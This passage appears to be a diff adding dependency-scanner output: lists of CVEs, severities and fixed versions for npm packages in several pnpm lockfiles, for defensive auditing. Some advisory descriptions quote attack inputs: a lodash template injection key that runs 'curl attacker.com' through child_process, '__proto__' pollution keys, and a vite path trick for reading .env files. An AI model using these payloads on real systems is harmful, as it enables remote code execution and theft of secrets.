+    ❯❱ brace-expansion - CVE-2026-33750
+          Severity: MODERATE                                                                       
+          Affected versions of brace-expansion are vulnerable to Uncontrolled Resource Consumption.
+                                                                                                   
+           ▶▶┆ Fixed for brace-expansion at versions: 1.1.13, 2.0.3, 3.0.2, 5.0.5
+          1233┆ brace-expansion@2.0.2:
+   
+    ❯❱ handlebars - GHSA-7rx3-28cr-v5wh
+          Severity: MODERATE                                                                            
+          Affected versions of handlebars are vulnerable to Improperly Controlled Modification of Object
+          Prototype Attributes ('Prototype Pollution').                                                 
+                                                                                                        
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+     ❱ handlebars - GHSA-442j-39wm-28r2
+          Severity: LOW                                                                                       
+          Affected versions of handlebars are vulnerable to Time-of-check Time-of-use (TOCTOU) Race Condition.
+                                                                                                              
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+    ❯❱ handlebars - CVE-2026-33916
+          Severity: MODERATE                                                                                
+          Affected versions of handlebars are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting') / Improperly Controlled Modification of Object Prototype      
+          Attributes ('Prototype Pollution').                                                               
+                                                                                                            
+           ▶▶┆ Fixed for handlebars at version: 4.7.9
+          1586┆ handlebars@4.7.8:
+   
+    ❯❱ js-yaml - CVE-2026-53550
+          Severity: MODERATE                                                                
+          Affected versions of js-yaml are vulnerable to Inefficient Algorithmic Complexity.
+                                                                                            
+           ▶▶┆ Fixed for js-yaml at versions: 3.15.0, 4.2.0
+          1718┆ js-yaml@4.1.0:
+   
+    ❯❱ lodash - CVE-2025-13465
+          Severity: MODERATE                                                                               
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly
+          Controlled Modification of Object Prototype Attributes ('Prototype Pollution').                  
+                                                                                                           
+           ▶▶┆ Fixed for lodash at version: 4.17.23
+          1761┆ lodash@4.17.21:
+   
+    ❯❱ lodash - CVE-2026-2950
+          Severity: MODERATE                                                                               
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly
+          Controlled Modification of Object Prototype Attributes ('Prototype Pollution').                  
+                                                                                                           
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          1761┆ lodash@4.17.21:
+   
+    ❯❱ picomatch - CVE-2026-33672
+          Severity: MODERATE                                                                           
+          Affected versions of picomatch are vulnerable to Improperly Controlled Modification of Object
+          Prototype Attributes ('Prototype Pollution').                                                
+                                                                                                       
+           ▶▶┆ Fixed for picomatch at versions: 2.3.2, 3.0.2, 4.0.4
+          1983┆ picomatch@2.3.1:
+   
+    ❯❱ postcss - CVE-2026-41305
+          Severity: MODERATE                                                                             
+          Affected versions of postcss are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting').                                                           
+                                                                                                         
+           ▶▶┆ Fixed for postcss at version: 8.5.10
+          2044┆ postcss@8.4.49:
+   
+     ❱ qs - CVE-2026-2391
+          Severity: LOW                                                       
+          Affected versions of qs are vulnerable to Improper Input Validation.
+                                                                              
+           ▶▶┆ Fixed for qs at version: 6.14.2
+          2060┆ qs@6.11.2:
+   
+    ❯❱ qs - CVE-2026-8723
+          Severity: MODERATE                                                 
+          Affected versions of qs are vulnerable to NULL Pointer Dereference.
+                                                                             
+           ▶▶┆ Fixed for qs at version: 6.15.2
+          2060┆ qs@6.11.2:
+   
+    ❯❱ uuid - CVE-2026-41907
+          Severity: MODERATE                                                                              
+          Affected versions of uuid are vulnerable to Improper Validation of Specified Index, Position, or
+          Offset in Input / Out-of-bounds Write.                                                          
+                                                                                                          
+           ▶▶┆ Fixed for uuid at versions: 11.1.1, 12.0.1, 13.0.1
+          2429┆ uuid@9.0.0:
+   
+     ❱ vite - CVE-2025-58752
+          Severity: LOW                                                                                   
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized
+          Actor / Improper Access Control / Relative Path Traversal.                                      
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 5.4.20, 6.3.6, 7.0.7, 7.1.5
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2026-53632
+          Severity: MODERATE                                                                                
+          Affected versions of launch-editor, vite, and vite-plus are vulnerable to External Control of File
+          Name or Path / Insufficiently Protected Credentials.                                              
+                                                                                                            
+           ▶▶┆ Fixed for vite at versions: 6.4.3, 7.3.5, 8.0.16
+          2449┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2026-39365
+          Severity: MODERATE                                                                              
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized
+          Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').         
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 6.4.2, 7.3.2, 8.0.5
+          2449┆ vite@5.4.14:
+   
+     ❱ vite - CVE-2025-58751
+          Severity: LOW                                                                                       
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized    
+          Actor / Improper Access Control / Improper Limitation of a Pathname to a Restricted Directory ('Path
+          Traversal').                                                                                        
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 5.4.20, 6.3.6, 7.0.7, 7.1.5
+          2449┆ vite@5.4.14:
+   
+    ❯❱ ws - CVE-2026-45736
+          Severity: MODERATE                                                      
+          Affected versions of ws are vulnerable to Use of Uninitialized Resource.
+                                                                                  
+           ▶▶┆ Fixed for ws at version: 8.20.1
+          2517┆ ws@8.18.0:
+   
+    ❯❱ yaml - CVE-2026-33532
+          Severity: MODERATE                                                 
+          Affected versions of yaml are vulnerable to Uncontrolled Recursion.
+                                                                             
+           ▶▶┆ Fixed for yaml at versions: 1.10.3, 2.8.3
+          2532┆ yaml@2.6.1:
+                                    
+    libs/react-client/pnpm-lock.yaml
+     ❱ @babel/core - CVE-2026-49356
+          Severity: LOW                                                                                       
+          Affected versions of @babel/core are vulnerable to Exposure of Sensitive Information to an          
+          Unauthorized Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
+                                                                                                              
+           ▶▶┆ Fixed for @babel/core at versions: 7.29.6, 8.0.0-rc.6
+          115┆ '@babel/core@7.23.3':
+   
+     ❱ @tootallnate/once - CVE-2026-3449
+          Severity: LOW                                                                           
+          Affected versions of @tootallnate/once are vulnerable to Incorrect Control Flow Scoping.
+                                                                                                  
+           ▶▶┆ Fixed for @tootallnate/once at versions: 2.0.1, 3.0.1
+          707┆ '@tootallnate/once@2.0.0':
+   
+    ❯❱ brace-expansion - CVE-2026-33750
+          Severity: MODERATE                                                                       
+          Affected versions of brace-expansion are vulnerable to Uncontrolled Resource Consumption.
+                                                                                                   
+           ▶▶┆ Fixed for brace-expansion at versions: 1.1.13, 2.0.3, 3.0.2, 5.0.5
+          868┆ brace-expansion@2.0.2:
+   
+    ❯❱ lodash - CVE-2025-13465
+          Severity: MODERATE                                                                               
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly
+          Controlled Modification of Object Prototype Attributes ('Prototype Pollution').                  
+                                                                                                           
+           ▶▶┆ Fixed for lodash at version: 4.17.23
+          1375┆ lodash@4.17.21:
+   
+    ❯❱ lodash - CVE-2026-2950
+          Severity: MODERATE                                                                               
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly
+          Controlled Modification of Object Prototype Attributes ('Prototype Pollution').                  
+                                                                                                           
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          1375┆ lodash@4.17.21:
+   
+    ❯❱ picomatch - CVE-2026-33672
+          Severity: MODERATE                                                                           
+          Affected versions of picomatch are vulnerable to Improperly Controlled Modification of Object
+          Prototype Attributes ('Prototype Pollution').                                                
+                                                                                                       
+           ▶▶┆ Fixed for picomatch at versions: 2.3.2, 3.0.2, 4.0.4
+          1519┆ picomatch@2.3.1:
+   
+    ❯❱ postcss - CVE-2026-41305
+          Severity: MODERATE                                                                             
+          Affected versions of postcss are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting').                                                           
+                                                                                                         
+           ▶▶┆ Fixed for postcss at version: 8.5.10
+          1542┆ postcss@8.4.47:
+   
+     ❱ tsup - CVE-2024-53384
+          Severity: LOW                                                                               
+          Affected versions of tsup are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting').                                                        
+                                                                                                      
+           ▶▶┆ Fixed for tsup at version: 
+          1823┆ tsup@7.2.0:
+   
+    ❯❱ uuid - CVE-2026-41907
+          Severity: MODERATE                                                                              
+          Affected versions of uuid are vulnerable to Improper Validation of Specified Index, Position, or
+          Offset in Input / Out-of-bounds Write.                                                          
+                                                                                                          
+           ▶▶┆ Fixed for uuid at versions: 11.1.1, 12.0.1, 13.0.1
+          1872┆ uuid@9.0.0:
+   
+     ❱ vite - CVE-2025-58752
+          Severity: LOW                                                                                   
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized
+          Actor / Improper Access Control / Relative Path Traversal.                                      
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 5.4.20, 6.3.6, 7.0.7, 7.1.5
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2026-53632
+          Severity: MODERATE                                                                                
+          Affected versions of launch-editor, vite, and vite-plus are vulnerable to External Control of File
+          Name or Path / Insufficiently Protected Credentials.                                              
+                                                                                                            
+           ▶▶┆ Fixed for vite at versions: 6.4.3, 7.3.5, 8.0.16
+          1889┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2026-39365
+          Severity: MODERATE                                                                              
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized
+          Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').         
+                                                                                                          
+           ▶▶┆ Fixed for vite at versions: 6.4.2, 7.3.2, 8.0.5
+          1889┆ vite@5.4.14:
+   
+     ❱ vite - CVE-2025-58751
+          Severity: LOW                                                                                       
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized    
+          Actor / Improper Access Control / Improper Limitation of a Pathname to a Restricted Directory ('Path
+          Traversal').                                                                                        
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 5.4.20, 6.3.6, 7.0.7, 7.1.5
+          1889┆ vite@5.4.14:
+   
+    ❯❱ ws - CVE-2026-45736
+          Severity: MODERATE                                                      
+          Affected versions of ws are vulnerable to Use of Uninitialized Resource.
+                                                                                  
+           ▶▶┆ Fixed for ws at version: 8.20.1
+          2005┆ ws@8.18.0:
+   
+    ❯❱ yaml - CVE-2026-33532
+          Severity: MODERATE                                                 
+          Affected versions of yaml are vulnerable to Uncontrolled Recursion.
+                                                                             
+           ▶▶┆ Fixed for yaml at versions: 1.10.3, 2.8.3
+          2031┆ yaml@2.3.4:
+                  
+    pnpm-lock.yaml
+     ❱ @babel/core - CVE-2026-49356
+          Severity: LOW                                                                                       
+          Affected versions of @babel/core are vulnerable to Exposure of Sensitive Information to an          
+          Unauthorized Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
+                                                                                                              
+           ▶▶┆ Fixed for @babel/core at versions: 7.29.6, 8.0.0-rc.6
+          105┆ '@babel/core@7.29.0':
+   
+    ❯❱ brace-expansion - CVE-2026-45149
+          Severity: MODERATE                                                                       
+          Affected versions of brace-expansion are vulnerable to Uncontrolled Resource Consumption.
+                                                                                                   
+           ▶▶┆ Fixed for brace-expansion at version: 5.0.6
+          793┆ brace-expansion@5.0.5:
+   
+     ❱ diff - CVE-2026-24001
+          Severity: LOW                                                                                       
+          Affected versions of diff are vulnerable to Inefficient Regular Expression Complexity / Uncontrolled
+          Resource Consumption.                                                                               
+                                                                                                              
+           ▶▶┆ Fixed for diff at versions: 3.5.1, 4.0.4, 5.2.2, 8.0.3
+          1076┆ diff@4.0.2:
+   
+     ❱ esbuild - GHSA-g7r4-m6w7-qqqr
+          Severity: LOW                                                                                   
+          Affected versions of esbuild are vulnerable to Improper Limitation of a Pathname to a Restricted
+          Directory ('Path Traversal').                                                                   
+                                                                                                          
+           ▶▶┆ Fixed for esbuild at version: 0.28.1
+          1144┆ esbuild@0.27.7:
+   
+    ❯❱ lodash - CVE-2025-13465
+          Severity: MODERATE                                                                               
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly
+          Controlled Modification of Object Prototype Attributes ('Prototype Pollution').                  
+                                                                                                           
+           ▶▶┆ Fixed for lodash at version: 4.17.23
+          1771┆ lodash@4.17.21:
+   
+    ❯❱ lodash - CVE-2026-2950
+          Severity: MODERATE                                                                               
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.unset are vulnerable to Improperly
+          Controlled Modification of Object Prototype Attributes ('Prototype Pollution').                  
+                                                                                                           
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          1771┆ lodash@4.17.21:
+   
+    ❯❱ picomatch - CVE-2026-33672
+          Severity: MODERATE                                                                           
+          Affected versions of picomatch are vulnerable to Improperly Controlled Modification of Object
+          Prototype Attributes ('Prototype Pollution').                                                
+                                                                                                       
+           ▶▶┆ Fixed for picomatch at versions: 2.3.2, 3.0.2, 4.0.4
+          1952┆ picomatch@2.3.1:
+   
+    ❯❱ postcss - CVE-2026-41305
+          Severity: MODERATE                                                                             
+          Affected versions of postcss are vulnerable to Improper Neutralization of Input During Web Page
+          Generation ('Cross-site Scripting').                                                           
+                                                                                                         
+           ▶▶┆ Fixed for postcss at version: 8.5.10
+          1987┆ postcss@8.5.8:
+   
+     ❱ qs - CVE-2026-2391
+          Severity: LOW                                                       
+          Affected versions of qs are vulnerable to Improper Input Validation.
+                                                                              
+           ▶▶┆ Fixed for qs at version: 6.14.2
+          2031┆ qs@6.14.0:
+   
+    ❯❱ qs - CVE-2026-8723
+          Severity: MODERATE                                                 
+          Affected versions of qs are vulnerable to NULL Pointer Dereference.
+                                                                             
+           ▶▶┆ Fixed for qs at version: 6.15.2
+          2031┆ qs@6.14.0:
+   
+     ❱ tmp - CVE-2025-54798
+          Severity: LOW                                                                                
+          Affected versions of tmp are vulnerable to Improper Link Resolution Before File Access ('Link
+          Following').                                                                                 
+                                                                                                       
+           ▶▶┆ Fixed for tmp at version: 0.2.4
+          2300┆ tmp@0.2.3:
+   
+     ❱ undici - CVE-2026-11525
+          Severity: LOW                                                                   
+          Affected versions of undici are vulnerable to Permissive List of Allowed Inputs.
+                                                                                          
+           ▶▶┆ Fixed for undici at versions: 6.27.0, 7.28.0, 8.5.0
+          2395┆ undici@6.24.1:
+   
+    ❯❱ undici - CVE-2026-9679
+          Severity: MODERATE                                                                            
+          Affected versions of undici are vulnerable to Improper Neutralization of CRLF Sequences ('CRLF
+          Injection').                                                                                  
+                                                                                                        
+           ▶▶┆ Fixed for undici at versions: 6.27.0, 7.28.0, 8.5.0
+          2395┆ undici@6.24.1:
+   
+     ❱ undici - CVE-2026-6733
+          Severity: LOW                                                                                   
+          Affected versions of undici are vulnerable to Time-of-check Time-of-use (TOCTOU) Race Condition.
+                                                                                                          
+           ▶▶┆ Fixed for undici at versions: 6.27.0, 7.28.0, 8.5.0
+          2395┆ undici@6.24.1:
+   
+    ❯❱ uuid - CVE-2026-41907
+          Severity: MODERATE                                                                              
+          Affected versions of uuid are vulnerable to Improper Validation of Specified Index, Position, or
+          Offset in Input / Out-of-bounds Write.                                                          
+                                                                                                          
+           ▶▶┆ Fixed for uuid at versions: 11.1.1, 12.0.1, 13.0.1
+          2416┆ uuid@8.3.2:
+   
+    ❯❱ yaml - CVE-2026-33532
+          Severity: MODERATE                                                 
+          Affected versions of yaml are vulnerable to Uncontrolled Recursion.
+                                                                             
+           ▶▶┆ Fixed for yaml at versions: 1.10.3, 2.8.3
+          2469┆ yaml@2.3.1:
+                                        
+                                        
+┌──────────────────────────────────────┐
+│ 91 Unreachable Supply Chain Findings │
+└──────────────────────────────────────┘
+                           
+    frontend/pnpm-lock.yaml
+   ❯❯❱ @remix-run/router - CVE-2026-22029
+          Severity: HIGH                                                                                      
+          Affected versions of @remix-run/router and react-router are vulnerable to Improper Neutralization of
+          Input During Web Page Generation ('Cross-site Scripting'). Open navigation redirects in React       
+          Router's Framework Mode, Data Mode, and unstable RSC modes don't validate or sanitize redirect URLs 
+          returned from loaders or actions. If an attacker can influence a redirect path (for example via an  
+          open-redirect or other untrusted input), they can supply a crafted URL that triggers arbitrary      
+          JavaScript execution in the client. Declarative Mode (<BrowserRouter>) is not affected.             
+                                                                                                              
+           ▶▶┆ Fixed for @remix-run/router at version: 1.23.2
+          1650┆ '@remix-run/router@1.8.0':
+   
+    ❯❱ esbuild - GHSA-67mh-4wv8-2f99
+          Severity: MODERATE                                                                                  
+          Affected versions of esbuild are vulnerable to Origin Validation Error. esbuild's development server
+          responds to every request, including Server-Sent Events connections, with `Access-Control-Allow-    
+          Origin: *`. Any website a developer visits can therefore make cross-origin requests to the local dev
+          server and read the responses, leaking bundled source code, source maps, and served file paths.     
+          Starting the dev server via serve() reaches the vulnerable code path.                               
+                                                                                                              
+           ▶▶┆ Fixed for esbuild at version: 0.25.0
+          2703┆ esbuild@0.21.5:
+   
+   ❯❯❱ form-data - CVE-2026-12143
+          Severity: HIGH                                                                                      
+          Affected versions of form-data are vulnerable to Improper Neutralization of CRLF Sequences ('CRLF   
+          Injection'). form-data does not escape carriage return, line feed, or double-quote characters in the
+          field name and `filename` option passed to `FormData#append()`. These values are concatenated       
+          directly into the `Content-Disposition` header, so passing untrusted input as a field name or       
+          filename lets an attacker inject CRLF sequences and smuggle additional multipart headers/parts (e.g.
+          overriding backend-trusted fields).                                                                 
+                                                                                                              
+           ▶▶┆ Fixed for form-data at versions: 2.5.6, 3.0.5, 4.0.6
+          2811┆ form-data@4.0.0:
+   
+   ❯❯❯❱ form-data - CVE-2025-7783
+          Severity: CRITICAL                                                                                 
+          Affected versions of form-data are vulnerable to Use of Insufficiently Random Values. form-data    
+          generates its multipart boundary using Math.random(), which is predictable if an attacker can      
+          observe PRNG outputs. By determining the boundary value, an attacker can embed that boundary in a  
+          user-controlled field and inject arbitrary extra parameters into the multipart payload, potentially
+          manipulating or appending fields in downstream HTTP requests.                                      
+                                                                                                             
+           ▶▶┆ Fixed for form-data at versions: 2.5.4, 3.0.4, 4.0.4
+          2811┆ form-data@4.0.0:
+   
+   ❯❯❱ glob - CVE-2025-64756
+          Severity: HIGH                                                                                      
+          Affected versions of glob are vulnerable to Improper Neutralization of Special Elements used in an  
+          OS Command ('OS Command Injection'). A command injection flaw exists in the glob CLI's `-c/--cmd`   
+          option: it invokes the user's command with `shell: true`, passing matched filenames directly to a   
+          shell. An attacker who can place files named with shell metacharacters (e.g. `$(…)`, backticks, `;`,
+          `|`) can inject and execute arbitrary commands under the user or CI process's privileges.           
+                                                                                                              
+           ▶▶┆ Fixed for glob at versions: 10.5.0, 11.1.0
+          2877┆ glob@10.4.5:
+   
+   ❯❯❱ immutable - CVE-2026-29063
+          Severity: HIGH                                                                                     
+          Affected versions of immutable are vulnerable to Improperly Controlled Modification of Object      
+          Prototype Attributes ('Prototype Pollution'). This can let attackers inject properties into        
+          `Object.prototype` via crafted keys (e.g., `__proto__`, `constructor.prototype`), corrupting object
+          inheritance and enabling unexpected behavior, privilege escalation, or DoS attacks.                
+                                                                                                             
+           ▶▶┆ Fixed for immutable at versions: 3.8.3, 4.3.8, 5.1.5
+          3060┆ immutable@3.7.6:
+            ⋮┆----------------------------------------
+          3064┆ immutable@4.3.5:
+   
+    ❯❱ js-yaml - CVE-2025-64718
+          Severity: MODERATE                                                                                  
+          Affected versions of js-yaml are vulnerable to Improperly Controlled Modification of Object         
+          Prototype Attributes ('Prototype Pollution'). js-yaml is vulnerable to prototype pollution through  
+          its YAML merge key (`<<`) handling. When parsing untrusted YAML with `load`, `loadAll`, `safeLoad`, 
+          or `safeLoadAll`, a crafted document containing a `__proto__` key inside a merged mapping can modify
+          the prototype of the resulting object, leading to integrity violations in the application.          
+                                                                                                              
+           ▶▶┆ Fixed for js-yaml at versions: 3.14.2, 4.1.1
+          3263┆ js-yaml@4.1.0:
+   
+    ❯❱ js-yaml - CVE-2025-64718
+          Severity: MODERATE                                                                                  
+          Affected versions of js-yaml are vulnerable to Improperly Controlled Modification of Object         
+          Prototype Attributes ('Prototype Pollution'). js-yaml is vulnerable to prototype pollution through  
+          its YAML merge key (`<<`) handling. When parsing untrusted YAML with `load`, `loadAll`, `safeLoad`, 
+          or `safeLoadAll`, a crafted document containing a `__proto__` key inside a merged mapping can modify
+          the prototype of the resulting object, leading to integrity violations in the application.          
+                                                                                                              
+           ▶▶┆ Fixed for js-yaml at versions: 3.14.2, 4.1.1
+          3263┆ js-yaml@4.1.0:
+   
+   ❯❯❱ lodash - CVE-2026-4800
+          Severity: HIGH                                                                                      
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper  
+          Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for   
+          the variable option in _.template but did not apply the same validation to options.imports key      
+          names. Both paths flow into the same Function() constructor sink. When an application passes        
+          untrusted input as options.imports key names, an attacker can inject default-parameter expressions —
+          for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com")
+          — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith  
+          to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been   
+          polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and   
+          passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author        
+          suggested to use `eta` instead.                                                                     
+                                                                                                              
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          3323┆ lodash@4.17.21:
+   
+   ❯❯❱ lodash - CVE-2026-4800
+          Severity: HIGH                                                                                      
+          Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper  
+          Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for   
+          the variable option in _.template but did not apply the same validation to options.imports key      
+          names. Both paths flow into the same Function() constructor sink. When an application passes        
+          untrusted input as options.imports key names, an attacker can inject default-parameter expressions —
+          for example, a key such as x=process.getBuiltinModule("child_process").execSync("curl attacker.com")
+          — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith  
+          to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been   
+          polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and   
+          passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author        
+          suggested to use `eta` instead.                                                                     
+                                                                                                              
+           ▶▶┆ Fixed for lodash at version: 4.18.0
+          3323┆ lodash@4.17.21:
+   
+    ❯❱ mdast-util-to-hast - CVE-2025-66400
+          Severity: MODERATE                                                                                  
+          Affected versions of mdast-util-to-hast are vulnerable to Improper Input Validation / Improperly    
+          Controlled Modification of Dynamically-Determined Object Attributes. mdast-util-to-hast builds a    
+          code block className directly from the fenced code block language string without stripping          
+          whitespace, so character references in an attacker-controlled language identifier (e.g.             
+          ```js&#x20;xss) inject extra unprefixed CSS classes into the generated <code>/<pre> element. Calling
+          toHast on untrusted markdown lets an attacker apply arbitrary CSS classes (and any class-bound      
+          behavior) to rendered code blocks.                                                                  
+                                                                                                              
+           ▶▶┆ Fixed for mdast-util-to-hast at version: 13.2.1
+          3420┆ mdast-util-to-hast@13.1.0:
+   
+    ❯❱ mdast-util-to-hast - CVE-2025-66400
+          Severity: MODERATE                                                                                  
+          Affected versions of mdast-util-to-hast are vulnerable to Improper Input Validation / Improperly    
+          Controlled Modification of Dynamically-Determined Object Attributes. mdast-util-to-hast builds a    
+          code block className directly from the fenced code block language string without stripping          
+          whitespace, so character references in an attacker-controlled language identifier (e.g.             
+          ```js&#x20;xss) inject extra unprefixed CSS classes into the generated <code>/<pre> element. Calling
+          toHast on untrusted markdown lets an attacker apply arbitrary CSS classes (and any class-bound      
+          behavior) to rendered code blocks.                                                                  
+                                                                                                              
+           ▶▶┆ Fixed for mdast-util-to-hast at version: 13.2.1
+          3420┆ mdast-util-to-hast@13.1.0:
+   
+   ❯❯❱ minimatch - CVE-2026-26996
+          Severity: HIGH                                                                                      
+          Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity.         
+          `minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS): if an attacker can supply
+          a glob pattern containing many consecutive `*` wildcards followed by a literal that is absent from  
+          the target string, the generated `RegExp` (many repeated `[^/]*?` groups) can trigger exponential   
+          backtracking in V8, causing a single `minimatch()` call to consume excessive CPU and hang the       
+          process.                                                                                            
+                                                                                                              
+           ▶▶┆ Fixed for minimatch at versions: 10.2.1, 3.1.3, 4.2.4, 5.1.7, 6.2.1, 7.4.7, 8.0.5, 9.0.6
+          3550┆ minimatch@9.0.5:
+   
+   ❯❯❱ minimatch - CVE-2026-27903
+          Severity: HIGH                                                                                      
+          Affected versions of minimatch are vulnerable to Inefficient Algorithmic Complexity. `minimatch()`  
+          can be forced into extreme CPU usage (event loop starvation / DoS) when matching non‑matching paths 
+          against attacker-controlled glob patterns containing multiple non-adjacent `**` (globstar) segments.
+          In `matchOne()`, each globstar triggers unbounded recursive backtracking over all remaining path    
+          suffixes, with no memoization or budget limit, causing binomial/exponential growth in work and      
+          allowing small crafted patterns to stall a Node.js process for seconds to tens of seconds per call. 
+                                                                                                              
+           ▶▶┆ Fixed for minimatch at versions: 10.2.3, 3.1.3, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7
+          3550┆ minimatch@9.0.5:
+   
+   ❯❯❱ minimatch - CVE-2026-27904
+          Severity: HIGH                                                                                     
+          Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity.        
+          `minimatch()` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing        
+          attacker-controlled extglob patterns: nested `*()` or `+()` extglobs are compiled into regexes with
+          nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which can trigger catastrophic backtracking in
+          V8 and stall the Node.js event loop for seconds to minutes when matched against a crafted non-     
+          matching path string.                                                                              
+                                                                                                             
+           ▶▶┆ Fixed for minimatch at versions: 10.2.3, 3.1.4, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7
+          3550┆ minimatch@9.0.5:
+   
+   ❯❯❱ picomatch - CVE-2026-33671
+          Severity: HIGH                                                                                      
+          Affected versions of picomatch are vulnerable to Inefficient Regular Expression Complexity.         
+          Picomatch can compile certain extglob patterns (for example quantified +() and *() forms) into      
+          regular expressions with catastrophic backtracking, causing ReDoS and event-loop blocking when those
+          patterns are compiled or matched                                                                    
+                                                                                                              
+           ▶▶┆ Fixed for picomatch at versions: 2.3.2, 3.0.2, 4.0.4
+          3748┆ picomatch@2.3.1:
+   
+   ❯❯❱ rollup - CVE-2026-27606
+          Severity: HIGH                                                                                      
+          Affected versions of rollup are vulnerable to Improper Limitation of a Pathname to a Restricted     
+          Directory ('Path Traversal'). Rollup is vulnerable to arbitrary file write via path traversal:      
+          chunk/asset names derived from user-controlled inputs (e.g., CLI named inputs, manual chunk aliases,
+          or malicious plugins) are insufficiently sanitized, allowing `../` sequences to survive and be      
+          passed into `path.resolve` when computing output paths. This lets an attacker escape the configured 
+          output directory and overwrite arbitrary files on the host filesystem that the build process can    
+          write to, potentially leading to persistent RCE by clobbering shell/profile or other                
+          executable/config files.                                                                            
+                                                                                                              
+           ▶▶┆ Fixed for rollup at versions: 2.80.0, 3.30.0, 4.59.0
+          4132┆ rollup@4.31.0:
+   
+   ❯❯❱ vite - CVE-2026-53571
+          Severity: HIGH                                                                                      
+          Affected versions of vite and vite-plus are vulnerable to Exposure of Sensitive Information to an   
+          Unauthorized Actor / Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal').
+          Vite's server.fs.deny blocklist—which protects sensitive files such as .env and certificate files   
+          from being served—can be bypassed on Windows using alternate path representations (NTFS Alternate   
+          Data Stream syntax like `/.env::$DATA?raw`, or 8.3 short filenames), allowing an attacker to read   
+          otherwise-denied files when the dev server is exposed to the network.                               
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 6.4.3, 7.3.5, 8.0.16
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-31486
+          Severity: MODERATE                                                                                 
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized   
+          Actor / Improper Access Control. An attacker on the same network can exploit the server.fs.deny    
+          bypass to read arbitrary files from the server's filesystem, including sensitive files such as .env
+          files, private keys, and source code.                                                              
+                                                                                                             
+           ▶▶┆ Fixed for vite at versions: 4.5.12, 5.4.17, 6.0.14, 6.1.4, 6.2.5
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-32395
+          Severity: MODERATE                                                                               
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized 
+          Actor. An attacker on the network can craft HTTP requests containing '#' in the request-target to
+          bypass Vite's server.fs.deny restrictions and read arbitrary files from the host machine.        
+                                                                                                           
+           ▶▶┆ Fixed for vite at versions: 4.5.13, 5.4.18, 6.0.15, 6.1.5, 6.2.6
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-62522
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Improper Limitation of a Pathname to a Restricted       
+          Directory ('Path Traversal'). Vite's server.fs.deny blocklist—which protects sensitive files such as
+          .env and certificate files from being served—can be bypassed on Windows by appending a trailing     
+          backslash to request URLs, allowing an attacker to read otherwise-denied files.                     
+                                                                                                              
+           ▶▶┆ Fixed for vite at versions: 5.4.21, 6.4.1, 7.0.8, 7.1.11
+          4566┆ vite@5.4.14:
+   
+    ❯❱ vite - CVE-2025-31125
+          Severity: MODERATE                                                                                  
+          Affected versions of vite are vulnerable to Exposure of Sensitive Information to an Unauthorized    
